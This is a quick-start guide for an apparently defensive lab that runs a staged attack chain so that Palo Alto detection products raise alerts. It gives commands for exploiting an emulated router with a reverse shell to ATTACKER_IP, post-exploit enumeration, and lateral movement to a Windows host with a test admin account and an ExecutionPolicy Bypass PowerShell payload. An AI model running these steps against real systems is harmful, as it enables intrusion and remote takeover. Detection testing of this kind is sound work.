# Quick Start Guide - Attack Chain Lab

## Fast Setup (15 minutes)

### 1. Router Setup (5 minutes)

```bash
# On emulated router
cd /path/to/iec104_water_tank/router_simulation
pip3 install flask
sudo python3 vulnerable_router_server.py
```

**Verify:** Open browser to http://ROUTER_IP:8080 - you should see login page

---

### 2. Attacker Setup (3 minutes)

```bash
# On attacker machine
cd /path/to/iec104_water_tank/attacker_scripts
chmod +x *.sh *.py
pip3 install requests urllib3

# Optional advanced tools
sudo apt-get install -y nmap smbclient
pip3 install impacket
```

---

### 3. Windows Target Setup (5 minutes)

```powershell
# On Windows target
# 1. Install Cortex XDR agent
# 2. Enable RDP
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

# 3. Create test user
net user testuser Password123! /add
net localgroup Administrators testuser /add

# 4. Verify SMB is enabled (usually is by default)
Get-Service LanmanServer
```

---

### 4. Execute Attack Chain (2 minutes)

```bash
# On attacker machine
cd attacker_scripts

# Step 1: Exploit router
python3 01_router_exploit.py ROUTER_IP --attacker-ip ATTACKER_IP --reverse-shell

# Step 2: In the reverse shell, run enumeration
bash 02_post_exploit_enum.sh

# Step 3: Lateral movement
python3 03_lateral_movement.py -t WINDOWS_IP -u testuser -p Password123! --full-chain
```

---

### 5. Monitor Alerts

**Cortex XDR:**
- Navigate to Incidents
- Filter: Last 1 hour
- Expected: 15-25 alerts

**Device Security:**
- Monitor → Threat logs
- Expected: Command injection, port scan, lateral movement

**XSIAM:**
- Attack Surface → Incidents
- Expected: Full attack chain visualization

---

## One-Command Demo

### Full Automated Attack (After setup)

```bash
# Replace with your IPs
export ROUTER_IP=10.0.1.1
export ATTACKER_IP=10.0.1.100
export WINDOWS_IP=192.168.1.50
export WINDOWS_USER=testuser
export WINDOWS_PASS=Password123!

# Run full attack chain
python3 01_router_exploit.py $ROUTER_IP \
  --attacker-ip $ATTACKER_IP \
  --reverse-shell \
  --shell-method bash_tcp &

# Wait for shell, then:
sleep 10

python3 03_lateral_movement.py \
  -t $WINDOWS_IP \
  -u $WINDOWS_USER \
  -p $WINDOWS_PASS \
  --full-chain \
  --payload "powershell.exe -ExecutionPolicy Bypass -File C:\\Windows\\Temp\\payload.ps1"
```

---

## Minimal Requirements

| Component | Requirement |
|-----------|------------|
| Router | Linux, Python 3.8+, Flask |
| Attacker | Kali Linux or similar, Python 3.8+ |
| Windows Target | Windows 10+, Cortex XDR agent |
| Network | All systems can communicate |

---

## Expected Results

- **20-30 total alerts** across all Palo Alto products
- **4-phase attack chain** visible in XSIAM
- **calc.exe executed** via 11 different techniques
- **Complete attack timeline** documented

---

## Quick Troubleshooting

**No shell received?**
```bash
# Check firewall
sudo iptables -L
# Try different shell method
--shell-method netcat_fifo
```

**Can't connect to Windows?**
```powershell
# Windows: Enable WinRM
Enable-PSRemoting -Force
```

**No alerts?**
- Verify Cortex XDR agent is connected
- Check Device Security subscription is active
- Ensure time sync across all systems

---

## Full Documentation

See `ATTACK_CHAIN_LAB_GUIDE.md` for:
- Detailed architecture diagrams
- Step-by-step instructions
- Complete alert catalog
- Detection opportunities
- Cleanup procedures

---
